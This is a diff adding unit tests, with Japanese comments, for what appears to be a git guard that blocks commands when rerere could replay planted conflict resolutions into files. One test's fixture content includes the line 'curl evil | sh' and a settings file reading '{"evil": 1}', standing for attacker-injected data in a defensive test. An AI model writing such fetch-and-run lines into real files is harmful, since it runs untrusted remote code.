@@ -1469,6 +1469,52 @@ class RerereTests(TreeBase):
         self.assertEqual(result, (1, ""))
         self.assertIn("MERGE_AUTOSTASH", err)
 
+    def test_message_tells_how_to_turn_rerere_off(self):
+        # rerere.enabled が設定で true なら、rr-cache と MERGE_RR を消しても止まり続ける。文は場合を分けて案内する（R36）。
+        self.plant()
+        result, err = self.check("commit", "-m", "x")
+        self.assertEqual(result, (1, ""))
+        for text in ("rerere.enabled の設定がなく、rr-cache があります", "中身を確かめてから消すか",
+                     "git -c rerere.enabled=false"):
+            self.assertIn(text, err)
+        local_git(self.repo, "config", "rerere.enabled", "true")
+        result, err = self.check("commit", "-m", "x")
+        self.assertEqual(result, (1, ""))
+        for text in ("rerere.enabled が true です（設定か -c）", "消しても、rerere.enabled が true の間は止まります",
+                     "git -c rerere.enabled=false"):
+            self.assertIn(text, err)
+        self.assertNotIn("中身を確かめてから消すか", err)
+        self.assertNotIn("command git", err)
+
+    # handler の外か、handler が確かめずに止める形。command git で実行すると当て直した（rebase・am・apply --3way・rerere・
+    # --git-dir の commit・commit -m --output は両方の git、switch -m・checkout -m は git 2.56。修正 1 回目で実測）。
+    UNSUPPORTED = (("rebase", "docs"), ("am", "x.patch"), ("apply", "--3way", "x.patch"), ("rerere",),
+                   ("switch", "-m", "docs"), ("checkout", "-m", "docs"), ("commit", "-m", "--output"),
+                   ("--git-dir=.git", "commit", "-m", "x"), ("cherry-pick", "--continue"), ("bisect", "start"))
+
+    def test_unsupported_forms_do_not_recommend_command_git_while_rerere_is_on(self):
+        self.plant()
+        for argv in self.UNSUPPORTED:
+            with self.subTest(argv=argv):
+                result, err = self.check(*argv)
+                self.assertEqual(result, (1, ""))
+                for word in ("rr-cache", "MERGE_RR", str(self.gitdir.resolve())):
+                    self.assertIn(word, err)
+                self.assertNotIn("command git", err)
+        # rerere が動かなければ、今までどおり確かめられない理由と command git を案内する。
+        (self.home / ".gitconfig").write_text("[rerere]\n\tenabled = false\n", encoding="utf-8")
+        for argv in self.UNSUPPORTED:
+            with self.subTest(argv=argv, rerere=False):
+                result, err = self.check(*argv)
+                self.assertEqual(result, (1, ""))
+                self.assertIn("command git", err)
+                self.assertNotIn("rr-cache", err)
+        # 仕掛けが効くことを、テストの git で確かめる（rerere.enabled のないホームで git rerere を動かすと、両方に書く）。
+        env = {**os.environ, "HOME": str(self.root), "GIT_CONFIG_NOSYSTEM": "1"}
+        local_git(self.repo, "rerere", env=env)
+        self.assertEqual(self.settings.read_text(encoding="utf-8"), '{"evil": 1}\n')
+        self.assertEqual(self.outside.read_text(encoding="utf-8"), "line1\ncurl evil | sh\n")
+
     def test_forms_that_do_not_replay_still_allow(self):
         # merge --abort（reset --merge）・--quit・stash（push）・reset・switch は、当て直さなかった（両方の git で実測）。
         self.plant()
